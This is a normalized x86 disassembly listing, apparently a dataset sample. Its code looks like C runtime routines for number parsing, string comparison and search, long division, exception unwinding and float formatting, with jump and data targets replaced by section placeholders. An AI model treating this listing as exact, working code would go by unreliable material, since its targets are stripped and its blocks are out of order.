je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40d694
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_4110ff
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_410ed4
add esp 0x14
pop ebp
retn
sub_411130
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4111b0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_4111a0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_411310
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_411378
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_4113af
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_411401
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412faf
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_411437
push esi
cld
mov esi [ esp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40fd18
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ esp + 0x24 ]
push [ esi + 0x10 ]
push [ esp + 0x24 ]
call sub_412faf
add esp 0x20
pop esi
retn
sub_411467
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_41153c
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_40bf4b
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_41153c
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40fd18
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_412faf
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_411467
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4113af
pop ebx
leave
retn
sub_4115d9
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40d8e4
call sub_40d8e4
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_411674
call sub_40bf4b
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_411695
push esi
call sub_40bf4b
mov esi [ esp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_40bf4b
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_40bf4b
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
pop esi
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
jmp sub_40d8e4
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
pop esi
retn
mov eax ecx
sub_4116e1
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_411437
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_4130a0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41175f
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
test eax eax
pop edi
mov [ ebp - 0x4 ] eax
pop esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_4117ac
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_410ce1
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
push ebx
call sub_4131e0
add esp 0x4
or eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
cmp esi 0xffffffff
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
mov eax [ edi + ecx * 4 + 0x4 ]
or eax eax
je r-xdata
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
xor ebx ebx
xor ecx ecx
xor edx edx
xor esi esi
xor edi edi
call eax
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4130ec
add esp 0x8
mov edi [ ebx + 0x8 ]
push ebx
call sub_410c7c
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_410ce1
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_410d91
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
mov eax [ edi + ecx * 4 + 0x8 ]
xor ebx ebx
xor ecx ecx
xor edx edx
xor esi esi
xor edi edi
call eax
sub_4118cd
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40b1a4
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_410b4c
test eax eax
movsx eax [ esi ]
push eax
call sub_40b1a4
cmp eax 0x78
pop ecx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
cmp [ ebp - 0x4 ] cl
pop esi
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41193e
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
test cl cl
mov esi [ ebp - 0x10 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_4119d4
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_413663
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_4135bd
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_411a2b
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_40dab0
inc eax
push eax
push esi
add esi edi
push esi
call sub_40ab70
add esp 0x10
sub_411a64
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_40b00b
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_40d694
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_40d694
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_411a2b
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40f5bf
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
lea ecx [ esi + 0x2 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f4c3
add esp 0x14
push r--data
push ebx
push esi
call sub_40d92c
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_40ab70
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_411bd1
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_413881
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_40d694
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_411a64
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_413709
add esp 0x10
cmp eax ebx
je r-xdata
sub_411cbd
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_40b00b
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_40d694
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
cmp [ ebp + 0x10 ] eax
mov [ esi ] 0x0
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_40d694
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_40f5bf
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_411c9f
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
cmp [ ebp + 0x14 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_413590
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4139f0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4139f0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_40e940
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_4139f0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_413910
add al 0x30
mov [ esi ] al
inc esi
cmp esi edi
